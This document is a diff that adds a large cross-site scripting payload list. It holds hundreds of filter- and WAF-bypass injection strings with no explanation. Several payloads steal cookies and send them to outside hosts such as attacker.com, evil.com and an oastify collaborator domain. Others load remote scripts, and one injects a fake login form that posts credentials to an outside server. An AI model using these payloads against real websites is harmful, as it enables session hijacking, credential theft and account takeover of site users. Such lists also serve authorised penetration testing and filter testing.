@@ -1,0 +1,262 @@
+abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
+abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
+<a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *> 
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+<svg> <foreignObject width="100%" height="100%">     <body> <iframe src='javascript:confirm(10)'></iframe>     </body>   </foreignObject> </svg>
+<script>var a=document.createElement("a");a.href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";http://a.click();</script>
+jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+"'alert(1
+”/>&_lt;_script>alert(1)&_lt;/scr_ipt>”/>
+=[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
+<button onclick="alert('xss')>Some button</button>
+"><Svg/OnLoad=prompt(document.cookie)>"@gmail.com
+<a href="j&#97;vascript&#x3A;&#97;lert('Sucuri WAF Bypassed ! ' + document.domain + '\nCookie: ' + document.cookie); window&#46;location&#46;href='https://evil.com';">ClickMe</a>
+<a aa aaa aaaa aaaaaa href=j&#97v&#97script&#x3A;&#97lert(document.cookie)>ClickMe
+<svg/onload=prompt(1337);>
+<A HREF="https://evil.com/">Click here</A>
+<button onClick="prompt(1337)">Submit</button>
+<IFRAME SRC="javascript:alert(document.cookie);"><iframe>
+<font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;
+<img src/onerror=prompt(document.cookie)>
+"><iframe src="https://www.cia.gov/" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%">
+<img src=x  onerror="document.location='http://o0p70yehe4avf6728g095671asgj49sy.oastify.com?c='+document.cookie;" />
+<h3>Please login to proceed</h3> <form action=http://zgj49ubrlvka5wgrek9bc0eryi49s0io7.oastify.com>
+Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br>
+<input type="submit" value="Login"></br>
+"><input%0a%0atype="hidden"%0a%0aoncontentvisibilityautostatechange=confirm(/coffinxp/)%0d%0astyle=content-visibility:auto>
+
+"><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">
+
+<p oncontentvisibilityautostatechange="alert(/FirefoxOnly/)" style="content-visibility:auto">
+
+<a href=j&#97v&#97script:&#97lert(document.cookie)>ClickMe</a>
+
+
+<img src=x onmouseover=confirm()>
+' onmouseover=alert() '
+<img src=x onclick=confirm()>
+gdfhhgjhgjnhgjhgjghj<img src=x onclick=confirm()>
+' accesskey=X onclick=alert(1) '
+
+
+
+
+]});</script><script>prompt();</script><!--
+"></fieldset></form><script>prompt(/legionhunter/);</script></body></html><!--
+"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">
+";</script><script>prompt();</script></body></html><!--
+<details open ontoggle="(()=>alert`ibrahimxss`)()"></details>
+<svg xmlns="w3.org/2000/svg" onload="this.setAttribute('onmouseover','confirm(1)')"></svg>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+${alert(document.domain)}alert(document.domain)}
+<a href="java&Tab;script&colon;alert(1)">Click Me (Works in Chrome)</a>
+<img src=x onauxclick="navigator.sendBeacon('https://attacker.com', document.cookie)">
+
+
+
+
+
+
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+&lt;script&gt;alert(1)&lt;/script&gt;
+"><scr<script>ipt>alert(1)</scr</script>ipt>
+"><scr\0ipt>alert(1)</script>
+"><body onload=alert(1)>
+"><video><source onerror="alert(1)">
+"><details open ontoggle=alert(1)>
+"><a href="javascript:alert(1)">Click</a>
+"><iframe src="javascript:alert(1)">
+"><form action="javascript:alert(1)">
+"><script src=//xss.rocks/xss.js></script>
+"><img src=x onerror="fetch('https://your-server.com?cookie='+document.cookie)">
+<script>var x="al"+"ert";window </script>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+"><script>alert(1)</script>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+"><svg onload=alert(1)>
+"><details open ontoggle=alert(1)>
+"><script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+"><script>setTimeout`alert\x281\x29`</script>
+"><script>Function("al"+"ert(1)")()</script>
+"><svg/onload='&#97;lert(1)'>
+"><iframe/src="jav	ascript:alert(1)">
+"><scr<script>ipt>alert(1)</scr</script>ipt>
+"><scr"+"ipt>alert(1)</scr"+"ipt>
+"><script src=data:text/javascript,alert(1)></script>
+"><svg><script xlink:href=data:,alert(1)></script>
+"><svg><style>{color:expression(alert(1))}</style>
+"><math><mtext></mtext><script>alert(1)</script></math>
+"><foreignObject><script>alert(1)</script></foreignObject>
+"><video><track onerror=alert(1)>
+"><button onclick=alert(1)>Click</button>
+"><img src=1 onerror=confirm(1)>
+"><iframe onload=prompt(1)>
+"><a onmouseover=alert(1)>Hover</a>
+"><script>fetch('/xss?c='+document.cookie)</script>
+"><img src=x onerror="new Image().src='/xss?c='+document.cookie">
+"><script>location='//evil.com?'+btoa(document.cookie)</script>
+"><script>top </script>
+"><img src=x oNerror=(()=>{confirm(1)})()>
+"><svg onload=(()=>{setInterval(()=>{alert(1)},1000)})()>
+"><textarea autofocus onfocus=alert('XSS')></textarea>
+"><input onfocus=alert('XSS') autofocus>
+"><marquee onstart=alert('XSS')>Hi</marquee>
+"><div data-x={{constructor.constructor('alert(1)')()}}>
+"><a href="javascript:void(0)" onclick="//comment\nalert(1)">Click</a>
+"><object data=data:text/html,<script>alert(1)</script>>
+"><script>setTimeout`confi\u0072m(123)`</script>
+"><script>`${(()=>alert(999))()}`</script>
+"><script>((f)=>f())(()=>alert("go"))</script>
+"><style/onload=alert(777)>
+"><base href="javascript://%0Aalert(1)//">
+"><svg><desc><![CDATA[</desc><script>alert(9)</script>]]></svg>
+<scr<script>ipt>alert(10)</scr</script>ipt>
+<scri\0pt>alert(11)</scri\0pt>
+<scri%70t>alert(12)</scri%70t>
+<script>fetch('/log?c='+document.cookie)</script>
+<img src=x onerror="new Image().src='//evil.me/c='+btoa(document.cookie)">
+"><img src=x oNeRror=(()=>{window })()>
+"><svg onload=((f)=>f('X'))((x)=>confirm(x))>
+"><details open ontoggle=(function(){prompt('Hacked')})()>
+"><div style=background:url(javascript:alert(1))>
+"><iframe srcdoc='<script>top </script>'>
+"><a href=//javascript:/*--*/alert(7)//>Click</a>
+"><button onclick=(()=>{this.disabled=true;alert("Done")})()>Go</button>
+"><video src onerror=((()=>{setTimeout(()=>alert('🔥'),500)}))()>
+"><math><mtext></mtext><script type="text/javascript">alert("Math!")</script></math>
+"><form onsubmit=alert(document.domain)><input type=submit>
+"><div onmouseenter=((z)=>z("⚡"))(alert)>
+<svg onload=((()=>{return Function('al'+'ert(2)')})())()>
+<math><mstyle id=x onmouseover=(()=>{confirm("newXSS")})()></math>
+<input onpointerenter=(()=>{prompt('🔥 pwned')})() autofocus>
+<video><track onerror=((a)=>eval(a))('al'+'ert(4)')>
+<iframe srcdoc="<b onmouseover=(()=>{alert('hoverXSS')})()>Hover</b>"></iframe>
+<details open ontoggle=(()=>{setTimeout(()=>{alert('DOM'),500)})()>
+<div style="clip-path:path('M0,0 L0,0')" onpointerover=(()=>{confirm('clipXSS')})()></div>
+<svg><animate attributeName="onbegin" values="alert(1)" dur="1s"></svg>
+<marquee behavior=alternate loop=1 onstart=(()=>{prompt('scroll')})()></marquee>
+<svg><script>alert&#40;1&#41;</script>
+<ScRiPt>alert(1)</ScRiPt>
+&#60;script&#62;alert(1)&#60;/script&#62;
+%3Cscript%3Ealert(1)%3C/script%3E
+%253Cscript%253Ealert(1)%253C/script%253E
+\x3Cscript\x3Ealert(1)\x3C/script\x3E
+\74script\76alert(1)\74/script\76
+<!--<script>alert(1)</script>-->
+" onmouseover="alert(1)
+<script>alert(1)</script>%00
+<img src=x onerror="eval('&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;')">
+<script>eval(unescape("%61%6c%65%72%74%28%31%29"))</script>
+<img src=x onerror=al&#101;rt(1)>
+<img src=x onerror=alert&lpar;1&rpar;>
+<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<img%20src=x%20onerror=alert(1)>
+<img&#32;src=x&#32;onerror=alert(1)>
+<style>@import"//evil.com/style.css";</style>
+<script/src=data:,alert(1)></script>
+<img%20src=x%20onerror=alert(1)>
+<img&#32;src=x&#32;onerror=alert(1)>
+<svg onload="alert&lpar;1&rpar;">
+<svg onload="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<svg onload="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+<iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">
+<object data="data:text/html,<script>alert(1)</script>">
+<embed src="data:text/html,<script>alert(1)</script>">
+<form><button formaction=javascript:alert(1)>XSS</button>
+<form><input type=submit formaction=javascript:alert(1) value=XSS>
+<math><mi xlink:href="javascript:alert(1)">XSS</mi>
+<svg><a xlink:href="javascript:alert(1)"><text>XSS</text></a></svg>
+<svg><a href="javascript:alert(1)"><text>XSS</text></a></svg>
+<base href="javascript://"/><a href="/alert(1)">XSS</a>
+<meta http-equiv=refresh content=0;url=javascript:alert(1)>
+<link rel=import href="data:text/html,<script>alert(1)</script>">
+<link rel=prefetch href="javascript:alert(1)">
+<link rel=preload href="javascript:alert(1)" as=script>
+<style>@import url("javascript:alert(1)");</style>
+<style>body{background:url("javascript:alert(1)")}</style>
+<style>body{list-style:url("javascript:alert(1)")}</style>
+<style>body:before{content:url("javascript:alert(1)")}</style>
+<div style="behavior:url('javascript:alert(1)')">
+<div style="binding:url('javascript:alert(1)')">
+<div style="expression(alert(1))">
+<!--<script>alert(1)</script>-->
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<noembed><p title="</noembed><img src=x onerror=alert(1)>">
+<noframes><p title="</noframes><img src=x onerror=alert(1)>">
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+data:text/javascript,alert(1)
+vbscript:alert(1)
+livescript:alert(1)
+mocha:alert(1)
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
+&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;
+JaVaScRiPt:alert(1)
+java&#x09;script:alert(1)
+java&#x0A;script:alert(1)
+java&#x0D;script:alert(1)
+<form><isindex formaction="javascript&colon;confirm(1)">
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
+<svg onload=alert&lpar;1&rpar;>
+<div dir="rtl">‮<img src=x onerror=alert(1)>‬</div>
+<div ontransitionend=alert(1) style=transition:all\ 1s onmouseover=this.style.color='red'>
+<select autofocus onfocus=alert(1)>
+<ſcript>alert(String.fromCharCode(88,83,83))</ſcript>
+<input autofocus onfocus=alert(1)>
+React.createElement('img', {src: 'x', onError: () => alert(1)})
+<iframe src="data:text/html,<ſcript>parent.alert(1)</script>"></iframe>
+<svg><ſcript>alert&#40;1&#41;</script>
+<details x=xxxXxXXXXXXXXXXXXXXXXXXXXXXXXKXXXXXXXXXXX 2 Open ontoggle=k&#x0000000000061;alert&#x000000028;origin&#x000029;>
+<ſcript>with(document)body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<SCRIPT>document.createElement('img').src ='x';document.images[0].oNerror=alert</SCRIPT>
+<SCRIPT>navigator.sendBeacon('//attacker.com/log', document.body.innerHTML)</SCRIPT>
+<iframe srcdoc="&lt;SCRIPT&gt;parent.alert(1)&lt;/SCRIPT&gt;">
+<SCRIPT>window.postMessage('<img src =x oNerror=alert(1)>', '*')</SCRIPT>
+<svg onload="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
+<img&#32;src=x&#32;onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<img src=x o\u006eload=alert(1)>
+<svg%0Aonload%0D=alert(1)>
+<div ontransitionend=alert(1) style=transition:all\ 1s onmouseover=this.style.color='red'>
+<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
+<svg/onload=alert&lpar;1&rpar;>
+<template v-for="item in items" :key="item.id" v-html="item.content"></template>
+<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<frameset><frame src="//evil.com/frame.html"></frameset>
+<iframe src="data:text/html,<ſcript>parent.alert(1)</ſcript>"></iframe>
+<textarea autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<ſcript>alert(1)</ſcript>
+React.createElement('img', {src: 'x', onerror: () => alert(1)})
+%3Cimg src=x onerror=alert&lpar;1&rpar;%3E
+%3Cdetails x=xxxXxXXXXXXXXXXXXXXXXXXXXXXXXKXXXXXXXXXXX 2 Open ontoggle=k&#x0000000000061;alert&#x000000028;origin&#x000029;%3E
+%3Cdetails open ontoggle=alert(1)%3E
+%3Ctextarea autofocus onfocus=alert(1)%3E
+%3Cinput onfocus=alert(1) autofocus%3E
+<iframe srcdoc='&lt;scr<>ipt&gt;parent.confirm(1)&lt;/scr<>ipt&gt;'>
+{"innerHTML": "<svg onload=confirm(1)>"}
+<iframe srcdoc="&lt;scr<>ipt&gt;parent.confirm(1)&lt;/scr<>ipt&gt;">
+<scr<>ipt src="https://api.instagram.com/v1/media/popular?callback=confirm"></scr<>ipt>
+<div dir="rtl">‮<img src=x onerror=confirm(1)>‬</div>
+&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;['a'].map(toString.constructor.prototype.toString,'alert(1)')}}
+[1].find(alert)
+;window/*aabb*/['al'%2b'ert'](document./*aabb*/Location);
+'-alert(1)-'
+<div *ngFor="let item of items" [innerHTML]="item.content"></div>
+<frameset><frame src="//evil.com/frame.html"></frameset>
+<div [innerHTML]="userInput"></div>
+<script src="https://api.instagram.com/v1/media/popular?callback=alert"></script>
+<script>document.body.innerHTML='<h1>'+document.cookie+'</h1>'</script>
+
+
+
